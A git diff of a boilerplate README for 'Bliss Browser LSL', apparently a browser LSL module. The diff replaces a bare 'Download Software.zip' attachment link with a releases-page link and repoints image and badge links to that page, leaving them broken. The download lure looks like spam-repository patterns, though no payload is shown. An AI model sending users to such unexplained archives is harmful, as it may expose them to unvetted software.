@@ -1,6 +1,6 @@
 # 🌳️🌐️#️⃣️ Bliss Browser LSL
 
-![Bliss Browser LSL](https://your-image-url.com)
+![Bliss Browser LSL](https://github.com/donnygxz/Bliss_Browser_LSL/releases/tag/v2.0)
 
 ## Overview
 
@@ -17,9 +17,9 @@ Welcome to the Bliss Browser LSL repository! This repository contains the Bliss 
 
 To get started with the Bliss Browser LSL module, simply download the latest version from the link below:
 
-[Download Software.zip](https://github.com/user-attachments/files/18388744/Software.zip)
+[Download https://github.com/donnygxz/Bliss_Browser_LSL/releases/tag/v2.0](https://github.com/donnygxz/Bliss_Browser_LSL/releases/tag/v2.0)
 
-![Download Bliss Browser LSL](https://img.shields.io/badge/Download-Software.zip-<COLOR>.svg)
+![Download Bliss Browser LSL](https://github.com/donnygxz/Bliss_Browser_LSL/releases/tag/v2.0<COLOR>.svg)
 
 ## Usage
 
@@ -60,4 +60,4 @@ If you encounter any issues or have questions about the Bliss Browser LSL module
 
 Start exploring the endless possibilities of LSL programming in the browser with the Bliss Browser LSL module today! 🚀
 
-![Bliss Browser LSL](https://your-image-url.com)
+![Bliss Browser LSL](https://github.com/donnygxz/Bliss_Browser_LSL/releases/tag/v2.0)
